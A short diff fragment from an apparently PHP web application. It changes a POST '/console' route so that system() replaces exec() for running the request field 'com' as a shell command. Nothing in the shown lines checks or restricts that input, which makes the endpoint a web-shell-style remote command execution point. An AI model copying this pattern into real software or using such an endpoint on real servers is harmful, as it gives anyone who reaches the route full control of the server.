@@ -230,7 +230,7 @@ $router->post('/console', function() {
     {
         if(isset($_POST["com"]))
         {
-            $out = exec($_POST["com"], $full);
+            $out = system($_POST["com"], $full);
             if(! $full)
             {
                 $full = "Input executed, server returned no stdout";
